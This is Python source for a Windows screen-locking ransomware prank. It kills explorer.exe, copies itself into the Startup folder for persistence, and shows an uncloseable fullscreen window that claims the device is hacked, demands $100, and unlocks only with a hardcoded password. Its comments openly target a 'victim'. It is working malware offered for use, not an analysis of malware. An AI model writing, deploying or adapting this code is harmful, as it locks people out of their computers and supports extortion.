import os
from tkinter import * 
import webbrowser
from os import system 
from tkinter import messagebox
from time import *
sleep(3.0)

                        #USING BATCH SCRIPT AND IT IS A LANG OF WINDOWS TO KILL WINDOWS EXRORORER ON VICTIMS DEVICE
system("taskkill /f /im explorer.exe")
system("""copy "META-KILL.exe" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup""")

root = Tk()
root.title("All Your data has been killed")
                        #customize GUI for what will victim see
root.geometry("1200x1150+480+20")
#background for gui
root.configure(background="BLACK")
#to prevent the victim to close the attack via (x)
root.overrideredirect(1)

#end of custmization of what victim see
#function section
def web():
        webbrowser.open("www.google.com")
                        ##-- method to check the password to open the lock 
def kill():
    password = InputTxt.get()
    if password == "HACKER" :
        system("start explorer.exe")
        user = os.path.expanduser('~')
        file_path =""+user+"\\AppData\\Roaming\\Microsoft\\Windows\Start Menu\\Programs\\Startup\\META-KILL.exe"
        os.remove(file_path)
        root.destroy()

    else:
        messagebox.showwarning("Unclock DATA ","S0RRY PASS CODE IS NOT CORRECT")


#text section design
FirstLine = Label(text=" *THIS DEVICE HAS BEEN HACKED!!* ",bg="black",fg="red",font="COURIER 30") 
FirstLine.pack()       

SecondLine = Label(text="All your data/files/history/password with me ,only me can open it ",bg="black",fg="white",font="COURIER 15")
SecondLine.place(x=20,y=35)            


ThirdLine = Label(text="Don't Worry U Can Restore it, just pay 100$, remember your data expensive more than 100$ ",bg="black",fg="white",font="COURIER 15")
ThirdLine.place(x=20,y=60)
#end of text section design    
              
InputTxt = Entry(root,width=30,bg="white",fg="Black",font="COURIER 15") #box to recive the input from victim
InputTxt.place(x=200,y=100)
InputTxt.focus()                               #to make the victim when open , found the entry box ready to typing statge
#start of buttons sections
UnclockBtn =Button(root,text="Unlock",bg="white",fg="red",activebackground="black",activeforeground="red",cursor="hand2",font="courier 15",bd=0,command=kill)
UnclockBtn.place(x=199,y=130)
                          
PayBtn =Button(root,text="Pay",bg="white",fg="green",activebackground="green",activeforeground="red",cursor="hand2",font="courier 15",bd=2,command=web)
PayBtn.place(x=510,y=130)
#end of buttons section
root.mainloop()

